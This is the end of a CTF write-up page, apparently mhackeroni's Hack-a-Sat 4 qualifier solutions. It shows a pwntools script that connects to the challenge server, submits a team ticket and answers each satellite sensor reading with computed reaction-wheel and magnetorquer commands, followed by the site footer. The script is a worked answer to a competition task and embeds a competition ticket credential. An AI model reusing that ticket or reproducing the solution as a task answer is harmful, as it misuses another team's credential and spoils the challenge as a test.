</span></span><span class=line><span class=cl>	<span class=n>t</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>TIME</span> <span class=o>=</span> <span class=n>t</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>adjv</span> <span class=o>=</span> <span class=nb>any</span><span class=p>(</span><span class=n>t</span> <span class=ow>in</span> <span class=n>rng</span> <span class=k>for</span> <span class=n>rng</span> <span class=ow>in</span> <span class=n>VSLOTS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>adjw</span> <span class=o>=</span> <span class=nb>any</span><span class=p>(</span><span class=n>t</span> <span class=ow>in</span> <span class=n>rng</span> <span class=k>for</span> <span class=n>rng</span> <span class=ow>in</span> <span class=n>WSLOTS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>adjv</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>rwx</span> <span class=o>=</span> <span class=n>pwx</span><span class=p>(</span><span class=o>-</span><span class=n>vx</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>rwy</span> <span class=o>=</span> <span class=n>pwy</span><span class=p>(</span><span class=o>-</span><span class=n>vy</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>rwz</span> <span class=o>=</span> <span class=n>pwz</span><span class=p>(</span><span class=o>-</span><span class=n>vz</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>rwx</span> <span class=o>=</span> <span class=n>rwy</span> <span class=o>=</span> <span class=n>rwz</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>adjw</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>b</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=n>bx</span><span class=p>,</span> <span class=n>by</span><span class=p>,</span> <span class=n>bz</span><span class=p>],</span> <span class=n>dtype</span><span class=o>=</span><span class=s1>&#39;float64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>w</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=n>wx</span><span class=p>,</span> <span class=n>wy</span><span class=p>,</span> <span class=n>wz</span><span class=p>],</span> <span class=n>dtype</span><span class=o>=</span><span class=s1>&#39;float64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>rmx</span><span class=p>,</span> <span class=n>rmy</span><span class=p>,</span> <span class=n>rmz</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>cross</span><span class=p>(</span><span class=n>w</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>rmx</span> <span class=o>=</span> <span class=n>pmx</span><span class=p>(</span><span class=o>-</span><span class=n>rmx</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>rmy</span> <span class=o>=</span> <span class=n>pmy</span><span class=p>(</span><span class=o>-</span><span class=n>rmy</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>rmz</span> <span class=o>=</span> <span class=n>pmz</span><span class=p>(</span><span class=o>-</span><span class=n>rmz</span><span class=p>,</span> <span class=n>dt</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>rmx</span> <span class=o>=</span> <span class=n>rmy</span> <span class=o>=</span> <span class=n>rmz</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>rwx</span><span class=p>,</span> <span class=n>rwy</span><span class=p>,</span> <span class=n>rwz</span><span class=p>,</span> <span class=n>rmx</span><span class=p>,</span> <span class=n>rmy</span><span class=p>,</span> <span class=n>rmz</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;management.quals2023-kah5Aiv9.satellitesabove.me&#39;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;please:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;ticket{golf324482oscar4:GKUkXwTflQTacpeZCTn70CIbqdHDTYJ-pN58Nvss2iwjqrR1rYUPjuuaYtF7MP8UTA}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3601</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>data</span> <span class=o>=</span> <span class=n>read_sensors</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>t</span><span class=p>,</span> <span class=o>*</span><span class=n>v</span> <span class=o>=</span> <span class=n>data</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>w</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>4</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>m</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>4</span><span class=o>+</span><span class=mi>3</span><span class=p>:</span><span class=mi>4</span><span class=o>+</span><span class=mi>3</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>vmag</span> <span class=o>=</span> <span class=p>(</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>**</span><span class=mi>2</span> <span class=o>+</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>**</span><span class=mi>2</span> <span class=o>+</span> <span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>**</span><span class=mi>2</span><span class=p>)</span><span class=o>**</span><span class=mf>0.5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>resp</span> <span class=o>=</span> <span class=n>react</span><span class=p>(</span><span class=o>*</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>rw</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[:</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>rmag</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=mi>3</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;&lt;- Sensors : t=</span><span class=si>%4.0f</span><span class=s1>, |v|=</span><span class=si>%10.04f</span><span class=s1>, v=(</span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>),   w=(</span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>), m=(</span><span class=si>%10.2e</span><span class=s1>, </span><span class=si>%10.2e</span><span class=s1>, </span><span class=si>%10.2e</span><span class=s1>)&#39;</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>vmag</span><span class=p>,</span> <span class=o>*</span><span class=n>v</span><span class=p>,</span> <span class=o>*</span><span class=n>w</span><span class=p>,</span> <span class=o>*</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;-&gt; Response:                         w=(</span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>), mag=(</span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>, </span><span class=si>%10.04f</span><span class=s1>)&#39;</span><span class=p>,</span> <span class=o>*</span><span class=n>rw</span><span class=p>,</span> <span class=o>*</span><span class=n>rmag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{:.30f}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>,</span> <span class=n>resp</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2023-07-01-hackasat4-quals-writeups/index.md data-oid-likes=likes_writeups/2023-07-01-hackasat4-quals-writeups/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2020-12-05-hitcon2020-all-writeups/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HITCON 2020 - Write ups</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2020-12-05T00:00:00+00:00>5 December 2020</time>
</span></span></a></span><span></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>